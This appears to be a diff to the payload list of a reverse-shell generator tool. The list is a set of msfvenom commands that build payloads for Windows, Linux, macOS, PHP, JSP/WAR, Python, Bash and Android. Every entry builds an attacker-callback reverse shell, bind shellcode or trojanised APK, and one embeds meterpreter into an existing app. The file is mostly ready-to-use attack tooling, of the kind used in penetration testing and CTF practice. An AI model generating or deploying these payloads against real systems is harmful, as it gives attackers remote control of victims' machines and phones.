@@ -251,69 +251,98 @@ const msfvenomCommands =  withCommandType(
     CommandType.MSFVenom,
     [
         {
-            "name": "Windows Meterpreter Staged Reverse TCP",
-            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+            "name": "Windows Meterpreter Staged Reverse TCP (x64)",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
             "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
         },
         {
-            "name": "Windows Stageless Reverse TCP",
-            "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+            "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
+            "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
             "meta": ["msfvenom", "windows", "stageless", "reverse"]
         },
         {
-            "name": "Linux Meterpreter Staged Reverse TCP",
-            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > reverse.elf",
+            "name": "Windows Staged Reverse TCP (x64)",
+            "command": "msfvenom -p windows/x64/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+            "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
+        },
+        {
+            "name": "Windows Stageless Reverse TCP (x64)",
+            "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+            "meta": ["msfvenom", "windows", "stageless", "reverse"]
+        },
+        {
+            "name": "Linux Meterpreter Staged Reverse TCP (x64)",
+            "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
         },
         {
-            "name": "Linux Stageless Reverse TCP",
-            "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > reverse.elf",
+            "name": "Linux Stageless Reverse TCP (x64)",
+            "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
-            "name": "Linux Meterpreter Staged Reverse TCP (x86)",
-            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
+            "name": "Linux Meterpreter Staged Reverse TCP (x64)",
+            "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
         },
         {
-            "name": "macOS Stageless Reverse TCP (x86)",
-            "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
+            "name": "Windows Bind TCP ShellCode - BOF",
+            "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode",
+            "meta": ["msfvenom", "windows", "bind", "bufferoverflow"]
+        },
+        {
+            "name": "macOS Meterpreter Staged Reverse TCP (x64)",
+            "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+            "meta": ["msfvenom", "mac", "stageless", "reverse"]
+        },
+        {
+            "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
+            "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+            "meta": ["msfvenom", "mac", "stageless", "reverse"]
+        },
+        {
+            "name": "macOS Stageless Reverse TCP (x64)",
+            "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
             "meta": ["msfvenom", "mac", "stageless", "reverse"]
         },
         {
             "name": "PHP Meterpreter Stageless Reverse TCP",
-            "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php",
+            "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
+            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
+        },
+        {
+            "name": "PHP Reverse PHP",
+            "command": "msfvenom -p php/reverse_tcp LHOST={ip} LPORT={port} -o shell.php",
             "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
             "name": "JSP Stageless Reverse TCP",
-            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
             "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
             "name": "WAR Stageless Reverse TCP",
-            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
             "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
         },
         {
             "name": "Android Meterpreter Reverse TCP",
-            "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > malicious.apk",
+            "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
-
             "name": "Android Meterpreter Embed Reverse TCP",
-            "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} > payload.apk",
+            "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
             "name": "Python Stageless Reverse TCP",
-            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell.py",
+            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw -o shell.py",
             "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
         },
         {
             "name": "Bash Stageless Reverse TCP",
-            "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw > shell.sh",
+            "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
             "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
         },
     ]
